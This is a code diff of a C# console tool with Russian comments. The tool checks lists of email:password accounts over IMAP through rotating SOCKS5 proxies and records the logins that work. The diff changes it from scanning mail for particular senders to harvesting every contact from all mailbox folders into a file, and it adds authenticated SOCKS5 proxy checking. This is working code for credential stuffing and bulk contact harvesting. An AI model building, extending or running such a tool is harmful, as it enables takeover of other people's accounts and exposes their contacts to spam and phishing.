@@ -1,4 +1,4 @@
-﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
+﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IO;
@@ -2421,6 +2421,11 @@ private async Task TestAllProxies()
 
             await Task.WhenAll(tasks);
             await progressTask;
+            
+            // Финальная очистка дубликатов в файле (гарантируем что их не осталось)
+            var allLines = File.ReadAllLines(contactsFile).Distinct().ToList();
+            File.WriteAllLines(contactsFile, allLines);
+            Console.WriteLine($"\n✅ Сбор контактов завершен! Всего уникальных контактов сохранено: {allLines.Count}");
         }
 
         private async Task<HashSet<string>> ExtractAllContactsFromMailbox(ImapClient client)
@@ -2579,39 +2584,19 @@ private async Task TestAllProxies()
                                     Interlocked.Increment(ref validCount);
                                     try
                                     {
-                                        // Используем оптимизированное сканирование папок
-                                        var senderCounts = await ScanFoldersOptimized(clientResult.Client, senders);
+                                        // Используем НАШ НОВЫЙ МЕТОД который собирает ВСЕ КОНТАКТЫ из ВСЕХ ПАПОК
+                                        await ExtractAllContactsFromMailbox(clientResult.Client);
                                         try { await clientResult.Client.DisconnectAsync(true); } catch { }
                                         try { clientResult.Client.Dispose(); } catch { }
-                                        var total = senderCounts.Values.Sum();
-                                        if (total > 0)
-                                        {
-                                            var rec = $"{acc.Email}:{acc.Password}:{clientResult.UsedServer}:{clientResult.UsedPort}:{clientResult.UsedSsl}";
-                                            workingAccounts.Add((rec, senderCounts));
-                                            Interlocked.Increment(ref foundCount);
-                                            var sendersList = string.Join(", ", senderCounts.Select(kv => $"{kv.Key} ({kv.Value})"));
-                                            statusMsg = $"{accDisp} - ВАЛИДЕН, НАЙДЕНЫ сообщения: {sendersList}";
-                                            color = ConsoleColor.Green;
-                                            realTimeResults.Add($"✅ {accDisp} - найдено {total} писем");
-                                            
-                                            // Записываем найденный аккаунт в файл в реальном времени
-                                            var detailedRec = FormatDetailedRecord(rec, senderCounts);
-                                            lock (workingAccounts) {
-                                                File.AppendAllText(workingFile, rec + Environment.NewLine);
-                                                File.AppendAllText(results, detailedRec + Environment.NewLine);
-                                            }
-                                        }
-                                        else
-                                        {
-                                            statusMsg = $"{accDisp} - ВАЛИДЕН, но писем от отправителя не найдено";
-                                            color = ConsoleColor.Yellow;
-                                            realTimeResults.Add($"⚠️ {accDisp} - валиден, но писем нет");
-                                            
-                                            // Записываем валидный аккаунт в файл в реальном времени
-                                            var validRec = $"{acc.Email}:{acc.Password}:{clientResult.UsedServer}:{clientResult.UsedPort}:{clientResult.UsedSsl}";
-                                            lock (workingAccounts) {
-                                                File.AppendAllText(workingFile, validRec + Environment.NewLine);
-                                            }
+                                        // Аккаунт валиден, мы собрали все контакты из него через ExtractAllContactsFromMailbox
+                                        statusMsg = $"{accDisp} - ВАЛИДЕН, контакты извлечены";
+                                        color = ConsoleColor.Green;
+                                        realTimeResults.Add($"✅ {accDisp} - аккаунт обработан, все контакты сохранены");
+                                        
+                                        // Записываем валидный аккаунт в файл
+                                        var validRec = $"{acc.Email}:{acc.Password}:{clientResult.UsedServer}:{clientResult.UsedPort}:{clientResult.UsedSsl}";
+                                        lock (workingAccounts) {
+                                            File.AppendAllText(workingFile, validRec + Environment.NewLine);
                                         }
                                     }
                                     catch (Exception ex)
@@ -2655,15 +2640,13 @@ private async Task TestAllProxies()
             {
                 Console.SetCursorPosition(0, 0);
                 double percent = accounts.Count == 0 ? 0 : (processed * 100.0 / accounts.Count);
-                UI.DrawHeader("ПРОВЕРКА АККАУНТОВ", $"Потоки: {maxThreads}  Таймаут: {connectTimeout}s  Прокси: {(proxyEnabled ? "ВКЛ" : "ВЫКЛ")}", 90);
+                UI.DrawHeader("СБОР КОНТАКТОВ", $"Потоки: {maxThreads}  Таймаут: {connectTimeout}s  Прокси: {(proxyEnabled ? "ВКЛ" : "ВЫКЛ")}", 90);
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.Write($"ПРОГРЕСС: {percent:0.0}% | ");
                 Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.Write($"ВАЛИДНЫХ: {validCount} | ");
+                Console.Write($"ОБРАБОТАНО: {processed}/{accounts.Count} | ");
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write($"НАЙДЕНО: {foundCount} | ");
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                Console.Write($"ПРОВЕРЕНО: {processed}/{accounts.Count}   ");
+                Console.Write($"ВСЕ КОНТАКТЫ СОХРАНЯЮТСЯ В extracted_contacts.txt   ");
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine($"{spinner[processed % spinner.Length]}");
                 Console.ResetColor();
@@ -2705,6 +2688,18 @@ private async Task TestAllProxies()
                 return;
             }
             await Task.WhenAll(tasks);
+
+            // 🧹 Финальная очистка дубликатов в файле контактов (гарантируем что дублей нет)
+            string contactsFile = "extracted_contacts.txt";
+            if (File.Exists(contactsFile))
+            {
+                var allLines = File.ReadAllLines(contactsFile)
+                                  .Where(line => !string.IsNullOrWhiteSpace(line)) // Удаляем пустые строки
+                                  .Distinct() // Удаляем дубликаты
+                                  .ToList();
+                File.WriteAllLines(contactsFile, allLines);
+                UI.WriteLine($"\n✅ Сбор контактов завершен! Всего уникальных контактов сохранено: {allLines.Count}", ConsoleColor.Green);
+            }
 
             try
             {
@@ -2950,40 +2945,53 @@ class ProxyManager
     }
 
     private bool ValidateSocks5Proxy(string proxyLine, out string? validProxy)
-    {
-        validProxy = null;
-        
-        string cleanProxy = proxyLine.Trim();
-        
-        if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
         {
-            cleanProxy = cleanProxy.Substring(9);
-        }
-        else if (cleanProxy.Contains("://"))
-        {
-            Console.WriteLine($"[PROXY_ERROR] Отклонен не-SOCKS5 прокси: {proxyLine} (только SOCKS5 поддерживаются)");
-            return false;
-        }
+            validProxy = null;
+            
+            string cleanProxy = proxyLine.Trim();
 
-        var parts = cleanProxy.Split(':');
-        if (parts.Length < 2)
-        {
-            return false;
-        }
+            
+            if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
+            {
+                cleanProxy = cleanProxy.Substring(9);
+            }
+            else if (cleanProxy.Contains("://"))
+            {
+                Console.WriteLine($"[PROXY_ERROR] Отклонен не-SOCKS5 прокси: {proxyLine} (только SOCKS5 поддерживаются)");
+                return false;
+            }
 
-        if (!int.TryParse(parts[1], out int port) || port < 1 || port > 65535)
-        {
-            return false;
-        }
+            // Обрабатываем формат с аутентификацией: user:pass@host:port
+            string hostPortPart;
+            if (cleanProxy.Contains('@'))
+            {
+                var atParts = cleanProxy.Split('@');
+                hostPortPart = atParts[atParts.Length - 1]; // Берем хост:порт из конца строки
+            }
+            else
+            {
+                hostPortPart = cleanProxy;
+            }
 
-        if (string.IsNullOrWhiteSpace(parts[0]))
-        {
-            return false;
-        }
+            var hostPortParts = hostPortPart.Split(':');
+            if (hostPortParts.Length < 2)
+            {
+                return false;
+            }
 
-        validProxy = $"socks5://{cleanProxy}";
-        return true;
-    }
+            if (!int.TryParse(hostPortParts[1], out int port) || port < 1 || port > 65535)
+            {
+                return false;
+            }
+
+            if (string.IsNullOrWhiteSpace(hostPortParts[0]))
+            {
+                return false;
+            }
+
+            validProxy = $"socks5://{cleanProxy}";
+            return true;
+        }
 
     public string? GetNextProxy()
     {
@@ -3049,16 +3057,27 @@ class ProxyManager
                 var cleanProxy = proxy.Replace("socks5://", "");
                 string host;
                 int port;
+                string? username = null;
+                string? password = null;
                 
                 // Обрабатываем формат с аутентификацией: user:pass@host:port
                 if (cleanProxy.Contains('@'))
                 {
                     var atParts = cleanProxy.Split('@');
-                    var hostPortPart = atParts[atParts.Length - 1]; // Берем часть после последнего @
+                    var authPart = atParts[0];
+                    var hostPortPart = atParts[atParts.Length - 1];
                     var hostPortParts = hostPortPart.Split(':');
                     if (hostPortParts.Length < 2) return false;
                     host = hostPortParts[0];
                     port = int.Parse(hostPortParts[1]);
+                    
+                    // Извлекаем логин и пароль
+                    var authParts = authPart.Split(':');
+                    if (authParts.Length >= 2)
+                    {
+                        username = authParts[0];
+                        password = string.Join(":", authParts.Skip(1));
+                    }
                 }
                 else
                 {
@@ -3071,20 +3090,97 @@ class ProxyManager
 
             using var cts = new CancellationTokenSource(timeout);
             using var client = new TcpClient();
-            var connectTask = client.ConnectAsync(host, port, cts.Token).AsTask(); // добавили .AsTask()
+            var connectTask = client.ConnectAsync(host, port, cts.Token).AsTask();
             var completedTask = await Task.WhenAny(connectTask, Task.Delay(timeout, cts.Token));
-            if (completedTask == connectTask && client.Connected)
-            {
-                Console.WriteLine($"[PROXY_OK] Прокси работает: {proxy}");
-                client.Close();
-                return true;
-            }
-            else
+            
+            if (completedTask != connectTask || !client.Connected)
             {
                 Console.WriteLine($"[PROXY_FAIL] Прокси не отвечает: {proxy}");
                 MarkProxyAsDead(proxy);
                 return false;
             }
+
+            // SOCKS5 handshake с проверкой аутентификации
+            var stream = client.GetStream();
+            var networkStream = stream;
+            byte[] buffer = new byte[1024];
+
+            // Шаг 1: Отправляем версию SOCKS5 и поддерживаемые методы аутентификации
+            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
+            {
+                // Поддерживаем только аутентификацию с логином/паролем (метод 0x02)
+                byte[] greeting = { 0x05, 0x01, 0x02 };
+                await networkStream.WriteAsync(greeting, 0, greeting.Length, cts.Token);
+            }
+            else
+            {
+                // Анонимное подключение (метод 0x00)
+                byte[] greeting = { 0x05, 0x01, 0x00 };
+                await networkStream.WriteAsync(greeting, 0, greeting.Length, cts.Token);
+            }
+
+            // Читаем ответ от прокси с выбранным методом аутентификации
+            var bytesRead = await networkStream.ReadAsync(buffer, 0, 2, cts.Token);
+            if (bytesRead < 2 || buffer[0] != 0x05)
+            {
+                Console.WriteLine($"[PROXY_FAIL] Некорректный ответ SOCKS5 от прокси: {proxy}");
+                client.Close();
+                MarkProxyAsDead(proxy);
+                return false;
+            }
+
+            // Если прокси требует аутентификацию, а мы не передали данные — провал
+            if (buffer[1] == 0xFF)
+            {
+                Console.WriteLine($"[PROXY_FAIL] Прокси требует аутентификацию, а данные не переданы: {proxy}");
+                client.Close();
+                MarkProxyAsDead(proxy);
+                return false;
+            }
+
+            // Если нужно пройти аутентификацию с логином/паролем
+            if (buffer[1] == 0x02 && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
+            {
+                // Формируем пакет аутентификации (версия 0x01, длина логина, логин, длина пароля, пароль)
+                var userBytes = System.Text.Encoding.UTF8.GetBytes(username);
+                var passBytes = System.Text.Encoding.UTF8.GetBytes(password);
+                byte[] authRequest = new byte[3 + userBytes.Length + passBytes.Length];
+                authRequest[0] = 0x01;
+                authRequest[1] = (byte)userBytes.Length;
+                Array.Copy(userBytes, 0, authRequest, 2, userBytes.Length);
+                authRequest[2 + userBytes.Length] = (byte)passBytes.Length;
+                Array.Copy(passBytes, 0, authRequest, 3 + userBytes.Length, passBytes.Length);
+                
+                await networkStream.WriteAsync(authRequest, 0, authRequest.Length, cts.Token);
+                
+                // Читаем ответ аутентификации
+                bytesRead = await networkStream.ReadAsync(buffer, 0, 2, cts.Token);
+                if (bytesRead < 2 || buffer[1] != 0x00)
+                {
+                    Console.WriteLine($"[PROXY_FAIL] Неверный логин или пароль для прокси: {proxy}");
+                    client.Close();
+                    MarkProxyAsDead(proxy);
+                    return false;
+                }
+            }
+
+            // Пробуем подключиться к тестовому адресу (например, 8.8.8.8:53 чтобы проверить работоспособность)
+            byte[] connectRequest = { 0x05, 0x01, 0x00, 0x01, 8,8,8,8, 0x00, 0x35 };
+            await networkStream.WriteAsync(connectRequest, 0, connectRequest.Length, cts.Token);
+
+            // Читаем ответ на подключение
+            bytesRead = await networkStream.ReadAsync(buffer, 0, 10, cts.Token);
+            if (bytesRead < 10 || buffer[1] != 0x00)
+            {
+                Console.WriteLine($"[PROXY_FAIL] Прокси не может установить исходящее соединение: {proxy}, код ошибки: 0x{buffer[1]:X2}");
+                client.Close();
+                MarkProxyAsDead(proxy);
+                return false;
+            }
+
+            client.Close();
+            Console.WriteLine($"[PROXY_OK] Прокси полностью работает (аутентификация пройдена): {proxy}");
+            return true;
         }
         catch (Exception ex)
         {
